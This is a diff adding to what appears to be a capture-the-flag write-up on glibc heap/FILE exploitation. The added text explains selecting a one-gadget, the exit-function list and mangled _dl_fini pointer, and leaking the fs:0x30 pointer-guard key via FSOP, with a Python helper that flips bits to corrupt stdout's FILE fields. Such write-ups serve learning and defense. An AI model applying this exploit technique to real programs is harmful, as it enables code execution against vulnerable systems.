@@ -100,4 +100,42 @@ Lets find a suitable one gadget
 
 ![image](https://github.com/user-attachments/assets/4dd71422-ae29-4fae-9dd6-d0ae420e4c72)
 
-Set a breakpoint at `__libc_start_main` and move through each instruction until you reach the `call rdx`. We can see r12 and r15 is NULL which matches the condition for 0xe3afe
+Set a breakpoint at `__libc_start_main` and move through each instruction until you reach the `call rdx`. We can see r12 and r15 is NULL which matches the condition for 0xe3afe. Now that we know which one gadget to use, its time for the next step. Whenever a program exits, it will go through a list of exit functions.
+
+![image](https://github.com/user-attachments/assets/3b9cc575-dfe2-4216-b47e-7023a26e3157)
+
+The image above shows the exit funcs struct. We can see a list of functions defined there. By default, there is a function that is always called which is `_dl_fini`. It is stored in the list with flavor 4. The pointer is mangled because it will be encrypted with a key located in fs register.
+
+![image](https://github.com/user-attachments/assets/26b5c826-f9f1-494b-8ae1-31d880e311d7)
+
+When decrypting the mangled pointer, it will rotate right by 0x11 bytes and XOR with a key stored at fs:0x30. 
+
+![image](https://github.com/user-attachments/assets/ed92f125-0e78-4d01-8ff4-37bfc5519a15)
+
+Run the `fsbase` command in pwndbg to see the address of fs. So, our next goal will be to use FSOP to leak this key. It could also be possible to overwrite the key with 0.
+
+```py
+def write_to_addr(target, current, addr):
+  bits = target ^ current
+  print(f"{hex(bits)=}")
+  for i, v in enumerate(bin(bits)[2:][::-1]):
+    print(i, v)
+    byte_num = i // 8
+    bit_num = i % 8
+    if v == "1":
+      sla(b"a: ", str(addr - libc.sym["_IO_2_1_stdin_"] + byte_num))
+      sla(b"b: ", str(bit_num))
+
+shortbuf = 0x83 + libc.symbols["_IO_2_1_stdout_"]
+
+## set stdout->write_base = fskey
+## set stdout->read_end = fskey
+## set stdout->write_ptr = fskey + 8
+write_to_addr(fskey, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x10)
+write_to_addr(fskey, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x20)
+write_to_addr(fskey+8, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x28)
+
+sla(b"a: ", "9")
+sla(b"b: ", "9")
+```
+
